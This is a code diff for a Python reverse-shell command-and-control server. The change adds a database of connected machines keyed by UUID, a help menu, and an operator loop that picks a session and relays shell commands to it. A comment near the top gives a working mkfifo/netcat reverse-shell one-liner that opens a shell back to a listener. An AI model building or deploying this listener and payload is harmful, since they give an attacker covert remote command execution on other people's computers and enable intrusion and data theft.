@@ -1,51 +1,80 @@
 import socket
 import threading
+from db import ComputerDatabase
 
 # this works rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8080 >/tmp/f
-
-sessions = {"work": None}
+DEFAULT_DB_PATH = "../computers.db"
+sessions = {}
 server_sockets = []
+
+def help_menu():
+    return (
+        "Available commands:\n"
+        "help - print this window\n"
+        "print - print all connections from the database\n"
+        "exit - close the connection\n"
+        "0 - select a UUID to work with\n"
+    )
 
 def handle_client(client_socket):
     # Print "HOORAY" when a session is established
     print("HOORAY")
-    #client_socket.send(b"biba\n")
-    sessions['work'] = client_socket
+    db = ComputerDatabase(DEFAULT_DB_PATH)
+    cuuid = db.insert_computer(1, "kali", "127.0.0.1")
+    sessions[cuuid] = client_socket
     # You can add more code here to handle client communication
     # client_socket.close()
 
 def work_with_customer(main_socket):
     print("HI")
-    
-    main_socket.send(b"Select 0 to work\n")
-    com = main_socket.recv(1024).decode().strip()
-    print(com.encode(), com)
-    main_socket.send(b"Working with\n")
-    if com == "0" and sessions["work"] is not None:
-        client_socket = sessions["work"]
-        pwd = client_socket.recv(1024).decode()
-        #main_socket.send(f"{pwd}".encode())
-        
-        while True:
-            #main_socket.send(b">> ")
-            command = main_socket.recv(1024).decode().strip()
-            if command == "exit":
-                break
-            elif command.startswith("cd "):
-                client_socket.send((command + "\n").encode())                
-            else:
-                client_socket.send((command + "\n").encode())
-                print(f"Waiting answer for'{command}'")
-                ans = client_socket.recv(4096).decode()
-                print("Answer from client", ans)
-                main_socket.send(ans.encode())
-                main_socket.send(client_socket.recv(1024))
+    while True:
+        try:
+            main_socket.send(b"Select help to print help menu\n>>")
+            com = main_socket.recv(1024).decode().strip()
+            print(com.encode(), com)
             
-    elif com == "exit":
-        main_socket.close()
-    else:
-        print(sessions)
-        main_socket.send(b"dead beef\n")
+            if com == "0":
+                main_socket.send(b"Please provide the UUID:\n")
+                uuid_input = main_socket.recv(1024).decode().strip()
+                
+                if uuid_input in sessions:
+                    client_socket = sessions[uuid_input]
+                    pwd = client_socket.recv(1024).decode()
+                    main_socket.send(f"Connected to UUID: {uuid_input}\n".encode())
+                    
+                    while True:
+                        command = main_socket.recv(1024).decode().strip()
+                        if command == "exit":
+                            break
+                        else:
+                            client_socket.send((command + "\n").encode())
+                            print(f"Waiting answer for '{command}'")
+                            ans = client_socket.recv(4096).decode()
+                            print("Answer from client", ans)
+                            main_socket.send(ans.encode())
+                else:
+                    main_socket.send(b"UUID not found in sessions.\n")
+            elif com == "exit":
+                main_socket.close()
+                break
+            elif com == "help":
+                help_text = help_menu()
+                main_socket.send(help_text.encode())
+            elif com == "print":
+                db = ComputerDatabase(DEFAULT_DB_PATH)
+                computers = db.get_computers()
+                response = "\n".join([str(computer) for computer in computers])
+                main_socket.send(response.encode())
+            else:
+                print(sessions)
+                main_socket.send(b"dead beef\n")
+        except BrokenPipeError:
+            main_socket.close()
+            break
+        except KeyboardInterrupt:
+            main_socket.close()
+            break
+
 
 def accept_clients(port, handler):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -81,6 +110,6 @@ def main():
             except OSError:
                 print(f"Already closed {sock.getsockname()[1]}")
 
-if __name__ == "__main__":
-    main()
+#if __name__ == "__main__":
+#    main()
 
